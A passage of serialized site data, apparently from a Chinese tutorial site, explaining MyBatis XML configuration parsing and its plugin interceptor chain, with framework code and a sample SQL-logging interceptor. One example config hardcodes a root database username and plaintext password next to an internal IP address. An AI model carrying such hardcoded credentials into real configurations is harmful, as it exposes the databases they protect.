中\n\n<resultMap> 标签配置一个 <select > 标签的 resultMap 属性返回结果对象的关系映射，他会得到对象以及得到描述的各 java 属性类型和对应的 TypeHandler 类型处理器，在返回的时候使用类型处理器，处理查询返回结果的数据类型对应 java 的映射。 <resultMap> 标签可以有多个，所以会添加到集合中，然后维护到 configuration 中\n\n<select> or <insert> 这里最主要的部分就是在解析完成后会把 namespace.id 做为 key ，把解析的信息 MappedStatement 做为 value ，维护到 configuration 中，以便 Mybatis 在被代理类调用方法的时候快速找到，该方法对应的 SQL 信息等\n\n# plugins 插件解析\n\n# settings 设置解析\n\n\n# 准备\n\n\n# 执行',normalizedContent:'mybatis 是一个 java 的 orm 框架，它使用 xml 或注解来配置和映射 sql 语句，同时提供了增删改查等常用操作的 api。mybatis 还提供了许多高级映射和查询功能，例如延迟加载、缓存和批量操作，这使得开发人员可以轻松地编写出高性能、可维护的数据访问层。\n\n关于 mybatis 我们主要要了解他的工作流程，特性，和部分重要的知识点，就像 spring，我们主要是了解他的生命周期，可扩展项等，所谓生命周期，也是 spring 的工作流程。\n\n以下是整个 mybatis 的工作流程图，对应图中会讲解每个节点重要的知识点。这里要记住 mybatis 主要的工作模式就是解析、准备和执行，所谓解析就是得到 xml 的信息，维护到一个叫 configuration 的配置类中；准备就是 opensession 部分，他会得到 configuration 中的信息，根据执行部分所使用的执行器，数据源，事务等进行实例化和关系映射；使用就是当我们去进行查询或新增等操作，从资源和信息中拿取已被缓存的对象或执行器等，执行对应的方法。\n\n\n\n\n# 解析\n\n解析部分对应图中 加载&解析xml 至 xmlconfigbuilder#mapperelement 这里，可以说是读取 xml 到维护各类对象关系和信息的核心。下面我们分解讲解每个步骤都做了哪些事情以及核心部分解析得到了什么。\n\n\n# 加载 & 解析 xml\n\n这部分主要是读取 mybatis-config-datasource.xml 文件，该文件主要维护了一些公共资源信息，包括环境信息（数据库连接信息），对应的 mapper 文件信息，设置信息等。\n\n<?xml version="1.0" encoding="utf-8"?>\n<!doctype configuration public "-//mybatis.org//dtd config 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    \x3c!-- 设置信息 --\x3e\n    <settings>\n        \x3c!-- 全局缓存：true/false 管理一级缓存和二级缓存的是否使用 --\x3e\n        <setting name="cacheenabled" value="true"/>\n        \x3c!--缓存级别：session/statement--\x3e\n        <setting name="localcachescope" value="statement"/>\n    </settings>\n    \x3c!-- 环境信息 --\x3e\n    <environments default="development">\n        <environment id="development">\n            <transactionmanager type="jdbc"/>\n            <datasource type="pooled">\n                <property name="driver" value="com.mysql.jdbc.driver"/>\n                <property name="url" value="jdbc:mysql://10.240.30.93:3306/test?useunicode=true&amp;characterencoding=utf8&amp;usessl=false"/>\n                <property name="username" value="root"/>\n                <property name="password" value="dev@root2021"/>\n            </datasource>\n        </environment>\n    </environments>\n    \x3c!-- 维护所有mapper --\x3e\n    <mappers>\n        \x3c!-- xml 配置 --\x3e\n        <mapper resource="mapper/activity_mapper.xml"/>\n    </mappers>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n读取到文件后调用 xmlconfigbuilder#parse 进行解析，解析内容如下。\n\n# configuration 初始化配置\n\n在整个文件解析之前，mybatis 会先把一些信息进行提前初始化，也就是上图中 new configuration（） 阶段，该类最终会被多个 mybatis 的类所引用并贯穿整个 mybatis 工作流程，由于被引用的类太多，这里就不一一列举，我们只要知道他贯穿整个流程即可。\n\n\n\nconfiguration 被初始化时包含了大量的信息，这些信息就是在解析 xml 文件时维护的，逐一讲解下每个配置的具体作用：\n\n * environment：缓存了环境 id（可设置默认环境，环境包括：开发环境、测试环境等），事务工厂，数据源（有池或无池或其他连接池）等\n * mapperregistry：映射注册机，缓存每个接口（ 接口对象class做为key ）所对应的 mapperproxyfactory ，提供添加映射代理类和获取代理类\n * mappedstatements：缓存 sql 语句的拆解信息。xml 的 namespace.标签id做为（key） ，value 为 mappedstatement，信息包括： mapper路径 ， sql类型（select|insert等） ， sql语句 ， 条件 ， 该条语句的缓存信息 ， 返回结果对象 ， 是否缓存标志 等。\n * resultmaps：缓存 resultmap 标签的拆解信息。xml 的 namespace.resultmap做为（key） ，然后对应 value 存放 sql字段，映射对象字段，字段java数据类型，类型对应的执行器 等\n * interceptorchain：缓存 plugins 标签的拆解信息。会在执行 newparameterhandler，newresultsethandler，newstatementhandler，newexecutor 进行拦截。\n * typealiasregistry：缓存了每个 java 基本类型的封装类，以及 jdbctransactionfactory，druiddatasourcefactory，unpooleddatasourcefactory，pooleddatasourcefactory，perpetualcache，fifocache 等 mybatis 提供的已知类，用于快速解析 xml 描述的值，便于快速得到 class 信息并获取实例。\n * typehandlerregistry：存放对应数据类型的处理策略，比如 java 类型，对应 sql 类型的处理策略，或 java 类型对应的处理策略。用于设置 sql 语句参数和获取查询结果的数据类型转换策略。\n * objectfactory：对象工厂，用于创建对象实例，使用反射。\n * objectwrapperfactory：对象包装器，放着，被解析对象的实例，以及对应的 set，get，构造器，类型等信息。 objectfactory 与 objectwrapperfactory 是为 metaobject 提供支持的，以解析对象信息进行，然后获取对象某个特定属性的数据，缓存是为了加快获取速度，如果属性也是一个对象则会递归缓存，获取值也会递归获取。\n * loadedresources：存放已被加载的 mapper.xml 文件，以防止重复加载\n * languageregistry：存放默认的语言解析驱动器，比如存放了 xmllanguagedriver ，提供快速获取这个解析器，然后提供 sql 解析。\n * cacheenabled：解析是否启用缓存，该配置对于二级缓存生效，一次缓存是默认缓存。\n * localcachescope：一级缓存，缓存策略默认是永久缓存，缓存方式分为 session 和 statement ， session 在该会话中命中相同 sql 语句和条件，若在该 session 中发生 insert/update/delete/commit/rollback/close 则会清除缓存，但是，并不会影响其它会话中的缓存； statement ，只针对当前会话执行的这一语句有效，执行完毕查询会立即清除缓存。\n * caches：二级缓存，基于 namespace 的缓存，可提供第三方其他方式实现。\n\n# environments 环境解析\n\n在环境解析过程中会得到下面几个重要的属性：\n\n * id：表明使用哪一个环境做为主要环境配置，解析 xml 中的 <environment > 标签\n * transactionfactory：解析 xml 中的 <transactionmanager> 的 type 属性，如果是 jdbc 则就是 jdbctransactionfactory ，也可以自行设置，需要自己注册到 typealiasregistry 中\n * datasourcefactory：解析 xml 中 <datasource> 的 type 属性，如果是 pooled ，则对应 pooleddatasourcefactory ， unpooled 对应 unpooleddatasourcefactory ， druid 对应 druiddatasourcefactory\n * datasource：解析 xml 中 <property> 得到具体的连接信息，从 datasourcefactory 中获取 datasource\n\n当以上的信息组件完毕后会封装到 environment 中，然后添加到 configuration\n\n# mapper 解析\n\n在 mapper 解析中有两种不同的解析，一个是我们常见的 xml 解析，一种是注解，如 @select，这里只讲 xml 解析，有关 @select 等注解解析，放在后续专开一章。那解析首先会读取所到所有的 mapper，在分别解析每个 mapper\n\n    <mappers>\n        \x3c!-- xml 配置 --\x3e\n        <mapper resource="mapper/activity_mapper.xml"/>\n    </mappers>\n\n\n1\n2\n3\n4\n\n\n一个完整的 mapper 大致包含如下信息，所以内部会有多个解析分别解析，如 cache 解析，resultmap 解析，select 解析，insert 解析等，我们这里说下重要的解析对象和作用即可。\n\n<mapper namespace="cn.bugstack.mybatis.test.dao.iactivitydao">\n    <cache eviction="fifo" flushinterval="600000" size="512" readonly="true"/>\n    <resultmap id="activitymap" type="cn.bugstack.mybatis.test.po.activity">\n        <id column="id" property="id"/>\n        <result column="activity_id" property="activityid"/>\n        <result column="activity_name" property="activityname"/>\n        <result column="activity_desc" property="activitydesc"/>\n        <result column="create_time" property="createtime"/>\n        <result column="update_time" property="updatetime"/>\n    </resultmap>\n    <select id="queryactivitybyid" parametertype="cn.bugstack.mybatis.test.po.activity" resultmap="activitymap" flushcache="false" usecache="true">\n        select activity_id, activity_name, activity_desc, create_time, update_time\n        from activity\n        <trim prefix="where" prefixoverrides="and | or" suffixoverrides="and">\n            <if test="null != activityid">\n                activity_id = #{activityid}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n<cache > 标签配置于二级缓存，对于缓存也会有单独的一章讲解，这里只讲解析得到的重要类及作用，通过标签会封装一个 cache 对象，该对象以 namespace 做为 cache 的 id ，并把 cache 对象添加到 configuration 中\n\n<resultmap> 标签配置一个 <select > 标签的 resultmap 属性返回结果对象的关系映射，他会得到对象以及得到描述的各 java 属性类型和对应的 typehandler 类型处理器，在返回的时候使用类型处理器，处理查询返回结果的数据类型对应 java 的映射。 <resultmap> 标签可以有多个，所以会添加到集合中，然后维护到 configuration 中\n\n<select> or <insert> 这里最主要的部分就是在解析完成后会把 namespace.id 做为 key ，把解析的信息 mappedstatement 做为 value ，维护到 configuration 中，以便 mybatis 在被代理类调用方法的时候快速找到，该方法对应的 sql 信息等\n\n# plugins 插件解析\n\n# settings 设置解析\n\n\n# 准备\n\n\n# 执行',charsets:{cjk:!0}},{title:"核心功能拆解 Plugin插件功能实现",frontmatter:{title:"核心功能拆解 Plugin插件功能实现",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/301/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/30.Mybatis/31.mybatis/301.%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E6%8B%86%E8%A7%A3%20Plugin%E6%8F%92%E4%BB%B6%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0.html",relativePath:"00.java/30.Mybatis/31.mybatis/301.核心功能拆解 Plugin插件功能实现.md",key:"v-6d19a90e",path:"/mybatis/mybatis/301/",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:38},{level:2,title:"注册",slug:"注册",normalizedTitle:"注册",charIndex:42},{level:2,title:"执行",slug:"执行",normalizedTitle:"执行",charIndex:46},{level:2,title:"自定义",slug:"自定义",normalizedTitle:"自定义",charIndex:5721}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"解析 注册 执行 自定义",content:'Mybatis Plugin 是随着 Mybatis 的工作流程一起被进行 解析->注册->执行 的，了解每个步骤才能更好的对 Mybatis 所提供的 Plugin 机制进行实现和扩展。在我们已知的 Mybatis 的插件有分页插件、缓存插件等，之所以可以能做到扩展是因为他在自己本身的 Executor（生产执行器） ， StatementHandler（语句处理器） ， ParameterHandler（参数处理器） ， ResultSetHandler（结果集处理器） 这四个地方做了拦截，当介绍到执行步骤的时候就可以看到具体实现。\n\n\n# 解析\n\n常规的 XML 配置\n\n<plugins>\n    <plugin interceptor="cn.mybatis.test.plugin.TestPlugin">\n        <property name="test00" value="100"/>\n        <property name="test01" value="200"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n6\n\n\n核心解析方法\n\nprivate void pluginElement(Element parent) throws Exception {\n    if (parent == null) return;\n    List<Element> elements = parent.elements();\n    for (Element element : elements) {\n        // 解析类路径\n        String interceptor = element.attributeValue("interceptor");\n        // 参数配置\n        Properties properties = new Properties();\n        List<Element> propertyElementList = element.elements("property");\n        for (Element property : propertyElementList) {\n            properties.setProperty(property.attributeValue("name"), property.attributeValue("value"));\n        }\n        // 获取插件实现类并实例化：cn.mybatis.test.plugin.TestPlugin \n        // 通过 Resources.classForName(string) 获取实例\n        Interceptor interceptorInstance = (Interceptor) resolveClass(interceptor).newInstance();\n        // 设置配置属性\n        interceptorInstance.setProperties(properties);\n        // 注册到 configuration 中\n        configuration.addInterceptor(interceptorInstance);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 注册\n\n解析的时候会在方法内部执行 configuration.addInterceptor(interceptorInstance); 这一步是把插件维护到 Configuration 全局配置中，但插件其实应该有很多各，所以提供的是一个 InterceptorChain 对象由 Configuration 维护\n\npublic class Configuration {\n    // 插件拦截器链\n    protected final InterceptorChain interceptorChain = new InterceptorChain();\n    public void addInterceptor(Interceptor interceptorInstance) {\n        interceptorChain.addInterceptor(interceptorInstance);\n    }\n    // other 其他配置\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nInterceptorChain 里面维护的是一个集合，专门存放所有的 Plugin\n\npublic class InterceptorChain {\n    // 插件拦截器容器\n    private final List<Interceptor> interceptors = new ArrayList<>();\n    //\n    public Object pluginAll(Object target) {\n        for (Interceptor interceptor : interceptors) {\n            target = interceptor.plugin(target);\n        }\n        return target;\n    }\n    // 添加到插件容器\n    public void addInterceptor(Interceptor interceptor) {\n        interceptors.add(interceptor);\n    }\n    public List<Interceptor> getInterceptors(){\n        return Collections.unmodifiableList(interceptors);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n从解析到注册这两步就可以看出，MyBatis 是把插件以拦截器的形式存放到一个拦截器容器里，这个容器是 Configuration 全局配置类来进行维护的\n\n\n# 执行\n\n执行是在调用具体的查询方法活其他在 Mybatis 里所描述的 SQL 方法时进行的触发，触发会在如下代码中的位置中触发。\n\n  // 创建参数处理器\n  public ParameterHandler newParameterHandler(MappedStatement mappedStatement, Object parameterObject, BoundSql boundSql) {\n    ParameterHandler parameterHandler = mappedStatement.getLang().createParameterHandler(mappedStatement, parameterObject, boundSql);\n    parameterHandler = (ParameterHandler) interceptorChain.pluginAll(parameterHandler);\n    return parameterHandler;\n  }\n \n  // 创建结果集处理器\n  public ResultSetHandler newResultSetHandler(Executor executor, MappedStatement mappedStatement, RowBounds rowBounds, ParameterHandler parameterHandler,\n      ResultHandler resultHandler, BoundSql boundSql) {\n    ResultSetHandler resultSetHandler = new DefaultResultSetHandler(executor, mappedStatement, parameterHandler, resultHandler, boundSql, rowBounds);\n    resultSetHandler = (ResultSetHandler) interceptorChain.pluginAll(resultSetHandler);\n    return resultSetHandler;\n  }\n \n  // 创建语句处理器\n  public StatementHandler newStatementHandler(Executor executor, MappedStatement mappedStatement, Object parameterObject, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql) {\n    StatementHandler statementHandler = new RoutingStatementHandler(executor, mappedStatement, parameterObject, rowBounds, resultHandler, boundSql);\n    statementHandler = (StatementHandler) interceptorChain.pluginAll(statementHandler);\n    return statementHandler;\n  }\n\n  // 生产执行器\n  public Executor newExecutor(Transaction transaction, ExecutorType executorType) {\n    executorType = executorType == null ? defaultExecutorType : executorType;\n    executorType = executorType == null ? ExecutorType.SIMPLE : executorType;\n    Executor executor;\n    if (ExecutorType.BATCH == executorType) {\n      // 批量处理器\n      executor = new BatchExecutor(this, transaction);\n    } else if (ExecutorType.REUSE == executorType) {\n      executor = new ReuseExecutor(this, transaction);\n    } else {\n      // 简单处理器\n      executor = new SimpleExecutor(this, transaction);\n    }\n    // 二级缓存处理器\n    if (cacheEnabled) {\n      executor = new CachingExecutor(executor);\n    }\n    executor = (Executor) interceptorChain.pluginAll(executor);\n    return executor;\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n会看到他会调用 InterceptorChain#pluginAll 方法，该类在注册步骤中有提及到，里面维护了所有的插件，那么在这里就会时循环所有的插件，每个插件调用 Interceptor#plugin\n\n// 循环调用\npublic Object pluginAll(Object target) {\n    for (Interceptor interceptor : interceptors) {\n        target = interceptor.plugin(target);\n    }\n    return target;\n}\n\n// 执行wrap\npublic interface Interceptor {\n    // 拦截，使用方实现\n    Object intercept(Invocation invocation) throws Throwable;\n    // 代理\n    default Object plugin(Object target) {\n        return Plugin.wrap(target, this);\n    }\n    // 设置属性\n    default void setProperties(Properties properties) {\n        // NOP\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nInterceptor#plugin 方法内部也就是调用 Plugin#wrap 静态方法，该方法通过获取自定义插件的注解，来观察你需要对哪个处理器，哪个方法以及参数类型去匹配拦截对象的具体方法，如果多一个参数都可能找不到要拦截的方法。找到方法后然后去动态代理这个方法。\n\n// \npublic class Plugin implements InvocationHandler {\n    private Object target;\n    private Interceptor interceptor;\n    private Map<Class<?>, Set<Method>> signatureMap;\n\n    private Plugin(Object target, Interceptor interceptor, Map<Class<?>, Set<Method>> signatureMap) {\n        this.target = target;\n        this.interceptor = interceptor;\n        this.signatureMap = signatureMap;\n    }\n    // 具体的代理实现\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        // 获取声明的方法列表\n        Set<Method> methods = signatureMap.get(method.getDeclaringClass());\n        // 过滤需要拦截的方法\n        if (methods != null && methods.contains(method)) {\n            // 调用 Interceptor#intercept 插入自己的反射逻辑\n            return interceptor.intercept(new Invocation(target, method, args));\n        }\n        return method.invoke(target, args);\n    }\n    /**\n     * 用代理把自定义插件行为包裹到目标方法中，也就是 Plugin.invoke 的过滤调用\n     */\n    public static Object wrap(Object target, Interceptor interceptor) {\n        // 取得签名Map\n        Map<Class<?>, Set<Method>> signatureMap = getSignatureMap(interceptor);\n        // 取得要改变行为的类(ParameterHandler|ResultSetHandler|StatementHandler|Executor)\n        Class<?> type = target.getClass();\n        // 取得接口\n        Class<?>[] interfaces = getAllInterfaces(type, signatureMap);\n        // 创建代理(StatementHandler)\n        if (interfaces.length > 0) {\n            // 代理\n            return Proxy.newProxyInstance(\n                    type.getClassLoader(),\n                    interfaces,\n                    new Plugin(target, interceptor, signatureMap));\n        }\n        return target;\n    }\n    /**\n     * 获取方法签名组 Map\n     */\n    private static Map<Class<?>, Set<Method>> getSignatureMap(Interceptor interceptor) {\n        // 取 Intercepts 注解\n        Intercepts interceptsAnnotation = interceptor.getClass().getAnnotation(Intercepts.class);\n        // 必须得有 Intercepts 注解，没有报错\n        if (interceptsAnnotation == null) {\n            throw new RuntimeException("No @Intercepts annotation was found in interceptor " + interceptor.getClass().getName());\n        }\n        // value是数组型，Signature的数组\n        Signature[] sigs = interceptsAnnotation.value();\n        // 每个 class 类有多个可能有多个 Method 需要被拦截\n        Map<Class<?>, Set<Method>> signatureMap = new HashMap<>();\n        for (Signature sig : sigs) {\n            Set<Method> methods = signatureMap.computeIfAbsent(sig.type(), k -> new HashSet<>());\n            try {\n                // 例如获取到方法；StatementHandler.prepare(Connection connection)、StatementHandler.parameterize(Statement statement)...\n                Method method = sig.type().getMethod(sig.method(), sig.args());\n                methods.add(method);\n            } catch (NoSuchMethodException e) {\n                throw new RuntimeException("Could not find method on " + sig.type() + " named " + sig.method() + ". Cause: " + e, e);\n            }\n        }\n        return signatureMap;\n    }\n    /**\n     * 取得接口\n     */\n    private static Class<?>[] getAllInterfaces(Class<?> type, Map<Class<?>, Set<Method>> signatureMap) {\n        Set<Class<?>> interfaces = new HashSet<Class<?>>();\n        while (type != null) {\n            for (Class<?> c : type.getInterfaces()) {\n                // 拦截 ParameterHandler|ResultSetHandler|StatementHandler|Executor\n                if (signatureMap.containsKey(c)) {\n                    interfaces.add(c);\n                }\n            }\n            type = type.getSuperclass();\n        }\n        return interfaces.toArray(new Class<?>[interfaces.size()]);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\n\n# 自定义\n\npackage cn.mybatis.test.plugin;\n\nimport cn.mybatis.executor.statement.StatementHandler;\nimport cn.mybatis.mapping.BoundSql;\nimport cn..mybatis.plugin.Interceptor;\nimport cn.mybatis.plugin.Intercepts;\nimport cn.mybatis.plugin.Invocation;\nimport cn.mybatis.plugin.Signature;\n\nimport java.sql.Connection;\nimport java.util.Properties;\n\n@Intercepts({@Signature(type = StatementHandler.class, method = "prepare", args = {Connection.class})})\npublic class TestPlugin implements Interceptor {\n\n    @Override\n    public Object intercept(Invocation invocation) throws Throwable {\n        // 获取StatementHandler\n        StatementHandler statementHandler = (StatementHandler) invocation.getTarget();\n        // 获取SQL信息\n        BoundSql boundSql = statementHandler.getBoundSql();\n        String sql = boundSql.getSql();\n        // 输出SQL\n        System.out.println("拦截SQL：" + sql);\n        // 放行\n        return invocation.proceed();\n    }\n\n    @Override\n    public void setProperties(Properties properties) {\n        System.out.println("参数输出：" + properties.getProperty("test00"));\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n',normalizedContent:'mybatis plugin 是随着 mybatis 的工作流程一起被进行 解析->注册->执行 的，了解每个步骤才能更好的对 mybatis 所提供的 plugin 机制进行实现和扩展。在我们已知的 mybatis 的插件有分页插件、缓存插件等，之所以可以能做到扩展是因为他在自己本身的 executor（生产执行器） ， statementhandler（语句处理器） ， parameterhandler（参数处理器） ， resultsethandler（结果集处理器） 这四个地方做了拦截，当介绍到执行步骤的时候就可以看到具体实现。\n\n\n# 解析\n\n常规的 xml 配置\n\n<plugins>\n    <plugin interceptor="cn.mybatis.test.plugin.testplugin">\n        <property name="test00" value="100"/>\n        <property name="test01" value="200"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n6\n\n\n核心解析方法\n\nprivate void pluginelement(element parent) throws exception {\n    if (parent == null) return;\n    list<element> elements = parent.elements();\n    for (element element : elements) {\n        // 解析类路径\n        string interceptor = element.attributevalue("interceptor");\n        // 参数配置\n        properties properties = new properties();\n        list<element> propertyelementlist = element.elements("property");\n        for (element property : propertyelementlist) {\n            properties.setproperty(property.attributevalue("name"), property.attributevalue("value"));\n        }\n        // 获取插件实现类并实例化：cn.mybatis.test.plugin.testplugin \n        // 通过 resources.classforname(string) 获取实例\n        interceptor interceptorinstance = (interceptor) resolveclass(interceptor).newinstance();\n        // 设置配置属性\n        interceptorinstance.setproperties(properties);\n        // 注册到 configuration 中\n        configuration.addinterceptor(interceptorinstance);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 注册\n\n解析的时候会在方法内部执行 configuration.addinterceptor(interceptorinstance); 这一步是把插件维护到 configuration 全局配置中，但插件其实应该有很多各，所以提供的是一个 interceptorchain 对象由 configuration 维护\n\npublic class configuration {\n    // 插件拦截器链\n    protected final interceptorchain interceptorchain = new interceptorchain();\n    public void addinterceptor(interceptor interceptorinstance) {\n        interceptorchain.addinterceptor(interceptorinstance);\n    }\n    // other 其他配置\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\ninterceptorchain 里面维护的是一个集合，专门存放所有的 plugin\n\npublic class interceptorchain {\n    // 插件拦截器容器\n    private final list<interceptor> interceptors = new arraylist<>();\n    //\n    public object pluginall(object target) {\n        for (interceptor interceptor : interceptors) {\n            target = interceptor.plugin(target);\n        }\n        return target;\n    }\n    // 添加到插件容器\n    public void addinterceptor(interceptor interceptor) {\n        interceptors.add(interceptor);\n    }\n    public list<interceptor> getinterceptors(){\n        return collections.unmodifiablelist(interceptors);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n从解析到注册这两步就可以看出，mybatis 是把插件以拦截器的形式存放到一个拦截器容器里，这个容器是 configuration 全局配置类来进行维护的\n\n\n# 执行\n\n执行是在调用具体的查询方法活其他在 mybatis 里所描述的 sql 方法时进行的触发，触发会在如下代码中的位置中触发。\n\n  // 创建参数处理器\n  public parameterhandler newparameterhandler(mappedstatement mappedstatement, object parameterobject, boundsql boundsql) {\n    parameterhandler parameterhandler = mappedstatement.getlang().createparameterhandler(mappedstatement, parameterobject, boundsql);\n    parameterhandler = (parameterhandler) interceptorchain.pluginall(parameterhandler);\n    return parameterhandler;\n  }\n \n  // 创建结果集处理器\n  public resultsethandler newresultsethandler(executor executor, mappedstatement mappedstatement, rowbounds rowbounds, parameterhandler parameterhandler,\n      resulthandler resulthandler, boundsql boundsql) {\n    resultsethandler resultsethandler = new defaultresultsethandler(executor, mappedstatement, parameterhandler, resulthandler, boundsql, rowbounds);\n    resultsethandler = (resultsethandler) interceptorchain.pluginall(resultsethandler);\n    return resultsethandler;\n  }\n \n  // 创建语句处理器\n  public statementhandler newstatementhandler(executor executor, mappedstatement mappedstatement, object parameterobject, rowbounds rowbounds, resulthandler resulthandler, boundsql boundsql) {\n    statementhandler statementhandler = new routingstatementhandler(executor, mappedstatement, parameterobject, rowbounds, resulthandler, boundsql);\n    statementhandler = (statementhandler) interceptorchain.pluginall(statementhandler);\n    return statementhandler;\n  }\n\n  // 生产执行器\n  public executor newexecutor(transaction transaction, executortype executortype) {\n    executortype = executortype == null ? defaultexecutortype : executortype;\n    executortype = executortype == null ? executortype.simple : executortype;\n    executor executor;\n    if (executortype.batch == executortype) {\n      // 批量处理器\n      executor = new batchexecutor(this, transaction);\n    } else if (executortype.reuse == executortype) {\n      executor = new reuseexecutor(this, transaction);\n    } else {\n      // 简单处理器\n      executor = new simpleexecutor(this, transaction);\n    }\n    // 二级缓存处理器\n    if (cacheenabled) {\n      executor = new cachingexecutor(executor);\n    }\n    executor = (executor) interceptorchain.pluginall(executor);\n    return executor;\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n会看到他会调用 interceptorchain#pluginall 方法，该类在注册步骤中有提及到，里面维护了所有的插件，那么在这里就会时循环所有的插件，每个插件调用 interceptor#plugin\n\n// 循环调用\npublic object pluginall(object target) {\n    for (interceptor interceptor : interceptors) {\n        target = interceptor.plugin(target);\n    }\n    return target;\n}\n\n// 执行wrap\npublic interface interceptor {\n    // 拦截，使用方实现\n    object intercept(invocation invocation) throws throwable;\n    // 代理\n    default object plugin(object target) {\n        return plugin.wrap(target, this);\n    }\n    // 设置属性\n    default void setproperties(properties properties) {\n        // nop\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\ninterceptor#plugin 方法内部也就是调用 plugin#wrap 静态方法，该方法通过获取自定义插件的注解，来观察你需要对哪个处理器，哪个方法以及参数类型去匹配拦截对象的具体方法，如果多一个参数都可能找不到要拦截的方法。找到方法后然后去动态代理这个方法。\n\n// \npublic class plugin implements invocationhandler {\n    private object target;\n    private interceptor interceptor;\n    private map<class<?>, set<method>> signaturemap;\n\n    private plugin(object target, interceptor interceptor, map<class<?>, set<method>> signaturemap) {\n        this.target = target;\n        this.interceptor = interceptor;\n        this.signaturemap = signaturemap;\n    }\n    // 具体的代理实现\n    @override\n    public object invoke(object proxy, method method, object[] args) throws throwable {\n        // 获取声明的方法列表\n        set<method> methods = signaturemap.get(method.getdeclaringclass());\n        // 过滤需要拦截的方法\n        if (methods != null && methods.contains(method)) {\n            // 调用 interceptor#intercept 插入自己的反射逻辑\n            return interceptor.intercept(new invocation(target, method, args));\n        }\n        return method.invoke(target, args);\n    }\n    /**\n     * 用代理把自定义插件行为包裹到目标方法中，也就是 plugin.invoke 的过滤调用\n     */\n    public static object wrap(object target, interceptor interceptor) {\n        // 取得签名map\n        map<class<?>, set<method>> signaturemap = getsignaturemap(interceptor);\n        // 取得要改变行为的类(parameterhandler|resultsethandler|statementhandler|executor)\n        class<?> type = target.getclass();\n        // 取得接口\n        class<?>[] interfaces = getallinterfaces(type, signaturemap);\n        // 创建代理(statementhandler)\n        if (interfaces.length > 0) {\n            // 代理\n            return proxy.newproxyinstance(\n                    type.getclassloader(),\n                    interfaces,\n                    new plugin(target, interceptor, signaturemap));\n        }\n        return target;\n    }\n    /**\n     * 获取方法签名组 map\n     */\n    private static map<class<?>, set<method>> getsignaturemap(interceptor interceptor) {\n        // 取 intercepts 注解\n        intercepts interceptsannotation = interceptor.getclass().getannotation(intercepts.class);\n        // 必须得有 intercepts 注解，没有报错\n        if (interceptsannotation == null) {\n            throw new runtimeexception("no @intercepts annotation was found in interceptor " + interceptor.getclass().getname());\n        }\n        // value是数组型，signature的数组\n        signature[] sigs = interceptsannotation.value();\n        // 每个 class 类有多个可能有多个 method 需要被拦截\n        map<class<?>, set<method>> signaturemap = new hashmap<>();\n        for (signature sig : sigs) {\n            set<method> methods = signaturemap.computeifabsent(sig.type(), k -> new hashset<>());\n            try {\n                // 例如获取到方法；statementhandler.prepare(connection connection)、statementhandler.parameterize(statement statement)...\n                method method = sig.type().getmethod(sig.method(), sig.args());\n                methods.add(method);\n            } catch (nosuchmethodexception e) {\n                throw new runtimeexception("could not find method on " + sig.type() + " named " + sig.method() + ". cause: " + e, e);\n            }\n        }\n        return signaturemap;\n    }\n    /**\n     * 取得接口\n     */\n    private static class<?>[] getallinterfaces(class<?> type, map<class<?>, set<method>> signaturemap) {\n        set<class<?>> interfaces = new hashset<class<?>>();\n        while (type != null) {\n            for (class<?> c : type.getinterfaces()) 